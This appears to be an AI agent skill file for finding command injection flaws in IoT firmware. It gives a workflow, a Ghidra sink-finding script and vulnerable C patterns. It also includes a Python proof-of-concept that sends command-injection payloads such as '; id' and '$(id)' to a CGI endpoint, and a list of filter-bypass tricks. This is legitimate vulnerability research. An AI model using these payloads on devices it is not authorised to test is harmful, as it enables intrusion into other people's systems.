---
name: command-injection
description: Command injection vulnerability hunting in IoT firmware. Use when analyzing CGI binaries, web server handlers, SOAP/UPnP interfaces, or any user-input-to-system-call path in embedded devices. Triggers on searching for OS command injection (CWE-78), argument injection (CWE-88), or code injection in firmware binaries and scripts.
---

# Command Injection Hunting

Find OS command injection vulnerabilities in IoT firmware binaries and scripts.

## Workflow

1. Identify attack surface (web interfaces, CLI, network services)
2. Locate dangerous function calls in binaries
3. Trace user input to dangerous sinks
4. Build and verify PoC

## Attack Surface Priority

| Priority | Target | Why |
|----------|--------|-----|
| 1 | CGI binaries in `/www/cgi-bin/` | Direct HTTP parameter → system() |
| 2 | Lua/PHP/ASP scripts in `/www/` | Interpreted, easier to audit |
| 3 | Main web server binary (httpd, goahead, boa) | Handles form submissions |
| 4 | UPnP/SOAP handlers | XML parameter injection |
| 5 | CLI utilities in `/usr/sbin/` | May be called by web handlers |
| 6 | MQTT/CoAP message handlers | IoT protocol entry points |

## Dangerous Functions (Binary Analysis)

Search for these imported functions in Ghidra/IDA:

```
system(), popen(), execve(), exec(), execl(), execlp()
doSystemCmd(), twsystem(), CsteSystem()  # vendor wrappers
wordexp()  # shell expansion
dlopen()   # dynamic library loading
```

Ghidra search:
```python
# In Ghidra script
dangerous = ["system", "popen", "execve", "doSystemCmd", "twsystem"]
for func in currentProgram.getFunctionManager().getFunctions(True):
    if any(d in func.getName().lower() for d in dangerous):
        print(f"SINK: {func.getName()} @ {func.getEntryPoint()}")
        for ref in getReferencesTo(func.getEntryPoint()):
            caller = currentProgram.getFunctionManager().getFunctionContaining(ref.getFromAddress())
            if caller:
                print(f"  <- {caller.getName()} @ {ref.getFromAddress()}")
```

## Input Tracing Patterns

### Pattern 1: HTTP Parameter → system()
```c
// Typical vulnerable CGI pattern
char *ip = getenv("QUERY_STRING");  // or websGetVar()
char cmd[256];
sprintf(cmd, "ping -c 3 %s", ip);  // No sanitization
system(cmd);                         // VULNERABLE
```

### Pattern 2: NVRAM → system()
```c
// Config value used unsafely
char *dns = nvram_get("wan_dns");
char cmd[512];
sprintf(cmd, "echo 'nameserver %s' > /etc/resolv.conf", dns);
system(cmd);  // Vulnerable if NVRAM is user-settable
```

### Pattern 3: Form POST → popen()
```c
char *user_input = web_get("hostname");
char buf[256];
snprintf(buf, sizeof(buf), "nslookup %s 2>&1", user_input);
FILE *fp = popen(buf, "r");  // VULNERABLE
```

## PoC Template

```python
import requests

target = "http://<device_ip>"
# Typical injection payloads
payloads = [
    "; id",
    "| id",
    "$(id)",
    "`id`",
    "\nid\n",
    "%0aid%0a",
    ";echo VULN_MARKER",
]

for payload in payloads:
    resp = requests.get(
        f"{target}/cgi-bin/vulnerable.cgi",
        params={"ip": payload},
        timeout=10,
        verify=False
    )
    if "uid=" in resp.text or "VULN_MARKER" in resp.text:
        print(f"VULNERABLE with payload: {payload}")
        print(resp.text)
        break
```

## Common Bypass Techniques

When basic injection is filtered:
- URL encoding: `%3bid` for `;id`
- Double encoding: `%253bid`
- Newline injection: `%0a` or `%0d%0a`
- Tab separator: `%09`
- `${IFS}` as space substitute: `ping${IFS}127.0.0.1`
- Backtick substitution when `$()` is filtered

## References

- **Vendor-specific patterns**: See [references/vendor-patterns.md](references/vendor-patterns.md) for known injection points per vendor
